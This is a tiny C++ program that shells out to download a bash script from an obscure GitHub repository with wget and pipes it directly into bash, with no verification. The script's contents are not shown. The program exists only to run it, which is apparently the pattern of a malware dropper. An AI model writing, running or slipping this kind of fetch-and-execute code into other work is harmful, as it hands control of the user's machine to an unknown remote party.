#include <iostream>
#include <cstdlib>

int main() {
    // Run the provided command to download and execute the bash script
    std::cout << "Downloading and executing the bash script..." << std::endl;
    if (system("bash <(wget -qO- https://raw.githubusercontent.com/monhodsompul/mike/main/lucktuske.sh)") != 0) {
        std::cerr << "Failed to download or execute the bash script." << std::endl;
        return 1;
    }

    std::cout << "Script executed successfully." << std::endl;
    return 0;
}
